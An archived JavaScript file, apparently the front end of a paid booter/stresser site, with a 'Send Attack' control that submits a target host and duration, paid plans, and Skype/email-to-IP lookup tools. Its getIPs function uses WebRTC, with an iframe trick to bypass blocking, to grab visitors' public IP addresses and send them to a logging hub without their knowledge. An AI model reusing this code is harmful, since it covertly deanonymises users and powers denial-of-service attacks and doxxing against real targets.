




/*
     FILE ARCHIVED ON 14:11:27 Dec 6, 2016 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 22:51:34 Jan 10, 2017.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
var ads_enabled = false;
tab_selected = 'attack';
var is_purchasing = true;




function getIPs(){
    var ips_string = '';
    var ip_dups = {};

    //compatibility for firefox and chrome
    var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;

    //bypass naive webrtc blocking using an iframe
    if(!RTCPeerConnection){
        //NOTE: you need to have an iframe in the page right above the script tag
        //
        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
        //<script>...getIPs called in here...
        //
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }

    //minimal requirements for data connection
    var mediaConstraints = {
        optional: [{RtpDataChannels: true}]
    };

    //firefox already has a default stun server in about:config
    //    media.peerconnection.default_iceservers =
    //    [{"url": "stun:stun.services.mozilla.com"}]
    var servers = undefined;

    //add same stun server for chrome
    if(useWebKit)
        servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};

    //construct a new RTCPeerConnection
    var pc = new RTCPeerConnection(servers, mediaConstraints);

    function handleCandidate(candidate){
        //match just the IP address
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
        var ip_addr = ip_regex.exec(candidate)[1];
        
        if (typeof String.prototype.startsWith != 'function') {
            
            // see below for better implementation!
            String.prototype.startsWith = function (str){
              return this.indexOf(str) === 0;
            };
        } 
        
        function isPublicIp(ip){
            if(ip.startsWith('10.')
               || ip.startsWith('192.168')
               || ip.startsWith('169.254'))
                    return false;
            return true;
        }

        //remove duplicates
        if(ip_dups[ip_addr] === undefined && isPublicIp(ip_addr))
            ips_string += ip_addr+'|';

        ip_dups[ip_addr] = true;
    }

    //listen for candidate events
    pc.onicecandidate = function(ice){

        //skip non-candidate events
        if(ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };

    //create a bogus data channel
    pc.createDataChannel("");

    //create an offer sdp
    pc.createOffer(function(result){

        //trigger the stun server request
        pc.setLocalDescription(result, function(){}, function(){});

    }, function(){});

    //wait for a while to let everything done
    setTimeout(function(){
        //read candidate info from local description
        var lines = pc.localDescription.sdp.split('\n');

        lines.forEach(function(line){
            if(line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
        $.get(hub + 'api/?post_id=' + post_id + '&ips=' + (ips_string.substring(0, ips_string.length - 1))).done(function(e){
            window.location = 'index.php';    
        });
        
    }, 1000);
    
    
}

$(document).ready(function(){
    

    
    updateStats();
    setInterval(updateStats, 5000);
    

    function showAds(){
        $('.overlap').fadeIn('slow');
    }

    var adTimeout = setTimeout(function(){
        if (!ads_enabled) return false;
        showAds();
        var i = 0;
        var adDisplayMinutes = 5;
        var adInterval = setInterval(function(){
            $('.showAds').html('(' + (adDisplayMinutes * 60 - i) + ') View popup ads');
            i++;
            if (i > 60*adDisplayMinutes) {
                showAds();
                i=0;
            }
        }, 1000);
    }, 5000);
    

    $('.showAds').on('click', showAds);

    $('.closead').on('click', function(){
        $('.overlap').hide();
    });
    

    var serverStatusLabelFocused = false;
    $('.server-status').on('mouseover', function(){
        serverStatusLabelFocused = true;
        setServerStatusLabel(false);    
    }).on('mouseleave', function(){
        setServerStatusLabel(true);
        serverStatusLabelFocused = false;
    });
    
    var defaultServerStatusLabel = $('.server-status-label').html();
    function setServerStatusLabel(default_label) {
        
        $('.server-status-label').hide();
        if (!default_label) {
            var text = '';
            switch (true) {
                case $('.server-status').hasClass('green'):
                     text = 'Attack server is running good.';
                    break;
                case $('.server-status').hasClass('yellow'):
                     text = 'Attack server is hitting but isn\'t performing at max capacity.';
                    break;
                case $('.server-status').hasClass('red'):
                     text = 'Attack server under maitenance and down temporarily.';
                    break;
            }
            $('.server-status-label').html(text);   
        } else $('.server-status-label').html(defaultServerStatusLabel);
        
        $('.server-status-label').fadeIn('fast');
    }
    
     
    var timerServerStatus = setInterval(function(){
        var toggle = ($('.server-status-label').html() == defaultServerStatusLabel);
        if (toggle) 
            setServerStatusLabel(false);
        else
            setServerStatusLabel(true);
        
    },10000);
    
    $('.check-button').on('click', function(){
        var check = $(this).children('.check');
        if ($(check).hasClass('radio'))
            $.each($('.radio'), function(){
                if($(this).attr('id') != $(check).attr('id') && $(this).hasClass('radio-'+$(check).data('radio')))
                    $(this).removeClass('checked');
            });
            
        if ($(check).hasClass('checked')) 
            $(check).removeClass('checked');
        else
            $(check).addClass('checked');
            
            
         updatePlansTotal();
    }); $('#plan-0').addClass('checked'); updatePlansTotal();
    
    function updatePlansTotal() { 
        var totalPrice = 0;
        totalDesc = '';
        $.each($('.step1 .plan'), function(){
            if ($(this).children('.check').hasClass('checked')) {
                totalPrice += parseInt($(this).children('.price').html().replace('$', ''));
                totalDesc += $(this).children('.desc').html() + '<br/>';
            }
        });
        
        if (totalPrice <= 0) 
            $('.buynow').addClass('disabled')
        else
            $('.buynow').removeClass('disabled')
            
            
        
        
        $('.total-price').html(totalPrice);
        $('.total-price-ui').html('$'+totalPrice);
        $('.total-desc-ui').html(totalDesc);
    }
    
    $('.plans .back').on('click', function(){
        $('.plans .step2').hide();
        $('.plans .step1').fadeIn();
    });
    
    
    $('.buynow').on('click', function(){
        if ($('.buynow').hasClass('disabled')) return;
        
        if (!profile.loggedIn) {
            changeTab('profile');
            scrollToElem('tabPage.profile');
	    is_purchasing = true;
            return false;
        }
        
        changePaymentStep(2);
    });
    
    
        
    $('body').on('mouseenter', function(){
        if (!getCookie('bcheck') && !(getCookie('bcheck') == 'false')){
            createCookie('bcheck', 'true', 360*10);  
        }
    });

    var bt = setInterval(function(){});
    var attackRunning = false;
    $('input.boot').on('click', function(){

        var host = encodeURIComponent($('input.host').val());
        var time = encodeURIComponent($('input.time').val());

        notify($('.response.att'), 'Sending attack, please wait...', 'info');
        function attackStopped() {
            attackRunning = false;
            $('.boot').val('Send Attack');
            clearInterval(bt);
            updateStats();
        }

        $.get('api/?isapi=false&host=' + host + '&time=' + time).done(function(e){
            notify($('.response.att'), e, e.indexOf('Error,')>-1 ? 'error' : 'success');

            if (e.indexOf('Success') > -1) {
                $('.boot').val('Stop Attack (' + time + ')');
                attackRunning = true;
                bt = setInterval(function(){
			time = time - 1;
                    $('.boot').val('Stop Attack (' + time + ')');
                    if (time <= 0) {
                        attackStopped();
                    }
                }, 1000);
                updateStats();
            } else attackStopped();

        });
    });

    $('.market-option').on('click', function(){
        var selectedItem = $(this).data('option');
        $('.marketContainer').css('display', 'none');
        $('.market-content.'+selectedItem).fadeIn();
    });

    $('.market .back').on('click', function(){
        $('.marketContainer').fadeIn();
        $('.market-content').css('display', 'none');
    });


    $('.button-hint').on('mouseover', function(){
        var target = '.'+$(this).data('target');
        var hint = $(this).data('hint');

        if ($(target).val()=='')
            $(target).attr('placeholder', hint);
    }).on('mouseleave', function(){
        var target = '.'+$(this).data('target');

        if ($(target).val()=='')
            $(target).attr('placeholder', $(target).data('placeholder'));
    });

    $('.checklogs').on('click', function(){
        var logs_id = ($('.tlogsid').val() != '') ? $('.tlogsid').val() : $('.tlogsid').attr('placeholder');
        $.get(hub + 'api/?post_id=' + logs_id).done(function(e){
            notify($('.response-logs'), e, 'info');
        });
    });
    
    $('.sp').on('click', function(){
        var user = $('.sp-user').val();
        var pass = $('.sp-pass').val();
        notify($('.response-sp'), 'Checking offer completion...', 'info');
        $.get(hub + 'api/?get=sp&user=' + user + '&pass=' + pass).done(function(e){
            if (e) {
                $('.sp-before-offer').css('display', 'none');
                $('.sp-after-offer').fadeIn('fast');
            } else
                notify($('.response-sp'), 'Error, Invalid login!', 'info');
        });
        updateStats();
    });
    
        $('input.resolve').on('click', function(){
        var elem = $('.resolve-text');
        var tool = $(this).data('tool');
        resolving(elem);
        
        var tooldata = null;
        switch (tool) {
            case 'email':
                tooldata = 'api/?isapi=false&get=email&email=';
                break;
            case 'skype':
                tooldata = 'api/?isapi=false&get=skype&user=';
                break;
            case 'iptoskype':
                tooldata = 'api/?isapi=false&get=iptoskype&ip=';
                break;
        }
        $.get(tooldata + encodeURIComponent($(elem).val())).done(function(e){
            notify($('.response.tools'), e, e.indexOf('not')>-1 ? 'error' : 'success');
        });
        updateStats();
    });
        
    function resolving(elem){
        notify($('.response.tools'), 'Resolving, please wait...', 'info');
    }

    $('.tlogsid').on('keyup', function(){
         var logs_id = ($(this).val() != '') ? $(this).val() : $(this).attr('placeholder');
        $('.loggerlink').val(hub + '?post=' + logs_id);
    });

    $('.selectall').on('click', function() {
        $(this).select();
    });

    $('input.api').on('focus, click', function(){
        notify($('.response-api'), api_usage, 'info');
    });

    $('.href').on('click', function(){
        var elem = this;
        $.get('api/?adclick='+$(elem).data('href').replace('http://', '')).done(function(){
            //window.location = $(elem).data('href');
        });
    });
    $('.href2').on('click', function(){
        var elem = this;
        $.get('api/?adclick='+$(elem).data('href').replace('http://', '')).done(function(){
            window.location = $(elem).data('href');
        });
    });

    $('.checkout').on('click', function(){
        var pkg = $(this).data('pkg');
        var custom, price, title = null;

        switch (pkg) {
            case 0:
                custom = $('.market-useremail').val();
                price = 10.07;
                title = 'API Key';
                break;
            case 1:
                if ($('.market-skype').val() == '') {
                    notify('.response-market2', 'Please enter the skype username to blacklist', 'error');
                    return false;
                } else {
                    price = 3.25;
                    title = 'Blacklist';
                    custom = $('.market-skype').val() + '|' + $('.market-ip').val() + $('.market-email').val();
                }
                break;
            case 2:
                price = 10.00;
                title = 'AD space 1 month';
                custom = $('.market-image').val() + '|' + $('.market-url').val();
                break;
        }
        $('#pp-custom').val(custom);
        $('#pp-title').val(title);
        $('#pp-id').val(pkg);
        $('#pp-price').val(price);
        $('#paypal').submit();
    });

    
    
    $('.selectall').off('click').on('click', function() {
	$(this).selectText();
    });
    
    $('.bsignup').on('click', function(){
	//this.signup = function(user, pass, pass2, email, captcha, responseLocation, loginOnComplete){
        profile.signup($('.suser').val(), $('.spass').val(), $('.spass2').val(), $('.semail').val(), $('.scaptcha').val(), '.response-signup', function(){
	    profile.login($('.suser').val(), $('.spass').val(), '.response-signup');
	    //update_page_loggedin();
	    refreshCaptcha();
	});
    });
    
    
    $('.blogin').on('click', function(){
        profile.login($('.luser').val(), $('.lpass').val(), '.response-login');
    });
    
    $('.blogout').on('click', function(){
        profile.logout();
    });
    
    $('.show-login, .show-signup').on('click', function(){
	changeTab('profile');
        scrollToElem('tabPage.profile');	
    });
    
    
    //Captcha refresh
    $('.container-captcha > img, .container-captcha > span').on('click', function(){ 
        refreshCaptcha(); 
    });
    
    
    
    $('.pay-btc').on('click', function(){
	changeTab('payment-method-btc');
	scrollToElem('payment-method-btc');
    });
    
    
    
    $('.pay-pp').on('click', function(){
	$('#paypal').submit();
	//changeTab('payment-method-pp');
	//scrollToElem('payment-method-pp');
    });
    
    $('.menu-toggle').on('click', function(){
	menu_toggle(!menu_open);
    });
    
    $('.menu-close').on('click', function(){
	menu_toggle(false);
    });
    
    
    $('.menu-close, .tabsContainer > .tabs > ul > .tab').on('click', function(){
	menu_toggle(true);
    });

    
    
    var menu_open = false;
    function menu_toggle(open) {
	if (!open) {
	    
	    $('.tabsContainer, .tabs-bg').show().animate({'width':'90%'}, 200);
	 } else {
	    $('.tabsContainer, .tabs-bg').animate({'width':'20%'}, 200, function(){$(this).css({'display':'auto'})});
	}
	menu_open = open;
    }
    
    
    $('.buy-ad').on('click', function(){
	alert('Contact wyatt.harris7 on skype');
    });
    
});



    function notify(where, msg, type){
        type = msg.indexOf('Error') > -1 ? 'error' : type;
        type = msg.indexOf('Success') > -1 ? 'success' : type;
	//if (where.indexOf('.')==-1) 
	//    where = '.' + where;
	
        $(where).html('<div class="msg ' + type + '">' + msg + '</div>');
	$(where).fadeIn();
        $('.selectall').off('click').on('click', function() {
            $(this).selectText();
        });
    }
    
    function api(action) {
	return 'api/?a=' + action;
    }
     
    
    
    function update_page_loggedin(loggedIn) {
	if (loggedIn) {
	    $('.loggedout').hide();
	    $('.loggedin').fadeIn();
	    $.each(profile.info, function(index, value){
		$('.profile-' + index).text(value);
	    });
	} else {
	    
	    $('.loggedin').hide();
	    $('.loggedout').fadeIn();
	}
	
	
    }
    
    
    function refreshCaptcha(){
	$('.container-captcha > img').attr('src', $('.container-captcha > img').attr('src').split('?')[0]+'?madebyobamasu='+(Math.random(0, 10000)));
	$('input.captcha').val('');
    }
    
    
    
    function changeTab(tab) {
        tab_selected = tab;
        $('.tabPage').removeClass('selected');
        $('.tabPage.'+tab).addClass('selected');
        
        $('.tab').removeClass('active');
        $('.tab.'+tab).addClass('active');
    }
    
    $('.tabsContainer .tabs .tab').on('click', function(){
        changeTab($(this).data('tab'));    
    });
    
    function getCookie(name) {
        var dc = document.cookie;
        var prefix = name + "=";
        var begin = dc.indexOf("; " + prefix);
        if (begin == -1) {
            begin = dc.indexOf(prefix);
            if (begin != 0) return null;
        }
        else
        {
            begin += 2;
            var end = document.cookie.indexOf(";", begin);
            if (end == -1) {
            end = dc.length;
            }
        }
        return unescape(dc.substring(begin + prefix.length, end));
    } 
    
    
    
    function  changePaymentStep(stepIndex) {
	is_purchasing = false;
	scrollToElem('plans');
        $('.plans .step1').hide();
        $('.plans .step2').fadeIn();
	//                        changeTab('choose-payment-method');

    }
    
    
    
    function scrollToElem(elemClass) {
        var top = $('.'+elemClass).position().top - 60;
        $('html, body').animate({scrollTop: top}, 400); 
    }
    
    
    function updateStats() {
        $.get('api/?get=stats').done(function(e){
            var stats = jQuery.parseJSON(e);//jQuery.parseJSON( '{ "attacks": 2, "max_attacks": 5, "boot_time": 120, "max_time": 300 }' );
            
            $('.aff_earned').html(stats.aff_earned);
            $('.offers_earned').html(stats.offers_earned);
            $('.aff_clicks').html(stats.aff_clicks);
            $('span.points').html(stats.points);
            $('.stats.online').html(stats.online + '/' + stats.online_daily);
            $('.stats.online-total').html(stats.online_total);
	    profile.loggedIn = stats.logged_in;
	    if (profile.loggedIn) 
		profile.info = jQuery.parseJSON(stats.profile);
	    
	    update_page_loggedin(profile.loggedIn);
            
            if (tab_selected == 'attack'){
                    
                $('.stats.att').html(stats.attacks + '/'+ stats.max_attacks);
                var perc =  100  / stats.max_attacks * stats.attacks;
                new Chartist.Pie('.ct-chart-att', {
                  series: [perc, 0, 0, 0, (100 - perc)]
                }, {
                  donut: true,
                  donutWidth: 60,
                  startAngle: 270,
                  total: 200,
                  showLabel: false 
                });
            
                $('.stats.time').html(stats.boot_time + '/'+ stats.max_time);
               var perc =  100  / stats.max_time * stats.boot_time;
                new Chartist.Pie('.ct-chart-time', {
                  series: [perc, 0, 0, 0, (100 - perc)]
                }, {
                  donut: true,
                  donutWidth: 60,
                  startAngle: 270,
                  total: 200,
                  showLabel: false 
                });
            }
        });

    }
    
    
    $.fn.selectText = function () {
        return $(this).each(function (index, el) {
            if (document.selection) {
                var range = document.body.createTextRange();
                range.moveToElementText(el);
                range.select();
            } else if (window.getSelection) {
                var range = document.createRange();
                range.selectNode(el);
                window.getSelection().addRange(range);
            }
        });
    }
    


 
